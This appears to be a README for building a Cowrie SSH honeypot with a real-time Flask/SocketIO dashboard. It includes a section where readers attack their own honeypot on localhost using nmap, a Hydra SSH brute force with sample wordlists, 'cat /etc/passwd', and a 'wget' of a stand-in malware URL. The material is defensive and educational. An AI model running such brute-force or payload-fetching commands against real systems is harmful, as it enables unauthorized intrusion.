# honeypot


A real-time honeypot monitoring system built with Cowrie, Flask, and SocketIO. Every SSH/Telnet connection, login attempt, and command run against your honeypot appears on the dashboard the moment it happens.

**Stack:**
- **Cowrie** — SSH/Telnet honeypot that logs every session, credential, and command
- **Flask + SocketIO** — real-time dashboard backend
- **Nmap** — port and service scanning
- **Hydra** — SSH brute-force testing

Everything runs on `localhost` by default. Nothing reaches the internet unless you explicitly expose it.

---

## Prerequisites

Ubuntu/Debian Linux — a VM, WSL2, or bare metal.

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip python3-venv git \
  libssl-dev libffi-dev build-essential
```

---

## Step 1 — Install Cowrie

### Create a dedicated user

```bash
sudo adduser --disabled-password cowrie
sudo su - cowrie
```

### Clone and set up the virtual environment

```bash
git clone https://github.com/cowrie/cowrie
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
```

### Install Cowrie

Source-checkout installs use `pip install -e` which creates the `cowrie` command inside your active venv.

```bash
python -m pip install --upgrade pip
python -m pip install -e '.[dev]'
```

Verify the command exists:

```bash
which cowrie
cowrie --help
```

### Configure

The `etc/` folder is empty after cloning — download the config template directly:

```bash
wget -O etc/cowrie.cfg \
  https://raw.githubusercontent.com/cowrie/cowrie/main/etc/cowrie.cfg.dist
```

Edit it:

```bash
nano etc/cowrie.cfg
```

Set these values:

```ini
[honeypot]
hostname = svr04
listen_endpoints = tcp:2222:interface=0.0.0.0

[output_jsonlog]
enabled = true
logfile = ${honeypot:log_path}/cowrie.json
```

### Start Cowrie

```bash
bin/cowrie start
bin/cowrie status

# Watch live logs
tail -f var/log/cowrie/cowrie.log
```

---

## Step 2 — Fix Log File Permissions

The dashboard runs as your normal user but Cowrie's logs are owned by the `cowrie` user. Grant read access:

```bash
sudo chmod o+rx /home/cowrie/
sudo chmod o+rx /home/cowrie/cowrie/
sudo chmod o+rx /home/cowrie/cowrie/var/
sudo chmod o+rx /home/cowrie/cowrie/var/log/
sudo chmod o+rx /home/cowrie/cowrie/var/log/cowrie/
sudo chmod o+r  /home/cowrie/cowrie/var/log/cowrie/cowrie.json
```

Verify your normal user can read it:

```bash
tail -5 /home/cowrie/cowrie/var/log/cowrie/cowrie.json
```

---

## Step 3 — Build the Dashboard

### Create the project

```bash
mkdir ~/honeypot && cd ~/honeypot
python3 -m venv venv
source venv/bin/activate
pip install flask flask-socketio watchdog
mkdir templates
```

### app.py

Create `app.py` in `~/honeypot/`. The `LOG_FILE` must point to Cowrie's JSON log across the user boundary:

```python
LOG_FILE = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
```

### templates/index.html

The `templates/` folder must live inside the same directory as `app.py`. If it's missing:

```bash
mkdir -p ~/honeypot/templates
```

Then create `templates/index.html` with the dashboard HTML.

### Run

```bash
cd ~/honeypot
source venv/bin/activate
python3 app.py
```

Open `http://localhost:5000` in your browser.

---

## Step 4 — Attack Your Own Honeypot

All commands target `localhost` only. Do not point these at anything you do not own.

### Nmap — reconnaissance scan

```bash
sudo apt install -y nmap
nmap -sV -p 2222 localhost
```

Expected: port 2222/tcp open, SSH service detected.

### Manual SSH attempt

```bash
ssh -p 2222 root@localhost
# Try passwords: password123, admin, 123456
# Watch the dashboard update in real time
```

### Hydra — SSH brute force

```bash
sudo apt install -y hydra

# Build wordlists
echo -e "root\nadmin\npi\nubuntu\nguest" > users.txt
echo -e "password\n123456\nadmin\npassword123\nraspberry\nletmein" > passwords.txt

# Run the brute force
hydra -L users.txt -P passwords.txt ssh://localhost:2222
```

The login attempts counter and Top Usernames / Top Passwords panels fill up in real time.

### Trigger the command logger

Cowrie accepts `root:root` by default. Log in and run commands inside the fake shell:

```bash
ssh -p 2222 root@localhost
# password: root

# Once inside the fake shell:
whoami
ls /etc
cat /etc/passwd
wget http://example.com/malware.sh
```

Every command appears in the Commands Entered by Attackers panel on the dashboard.

---

## Troubleshooting

| Problem | Fix |
|---|---|
| `etc/cowrie.cfg.dist` not found | `etc/` is empty after cloning — use the `wget` command in Step 1 |
| Dashboard shows zeros | Confirm `cowrie.json` exists: `tail -5 /home/cowrie/cowrie/var/log/cowrie/cowrie.json` |
| Port 2222 unreachable | Run `ss -tlnp \| grep 2222` — if empty, Cowrie is not running |
| Permission denied on log file | Re-run the `chmod o+r` commands in Step 2 |
| `TemplateNotFound: index.html` | Run `mkdir -p ~/honeypot/templates` and confirm `templates/` is next to `app.py` |
| Hydra too slow | Add `-t 10` flag for 10 parallel threads |

---

## Next Steps

- Add **GeoIP lookup** (MaxMind free tier) to map attacker IPs by country
- Expose the honeypot on a **cloud VM** (DigitalOcean, Linode) to capture real internet traffic
- Add **Slack or email alerts** when a login succeeds or a suspicious command runs
- Add an **HTTP honeypot** (DVWA or a simple Flask trap) alongside Cowrie to capture web attacks
- Use captured credentials to practice **password analysis** and understand attacker patterns
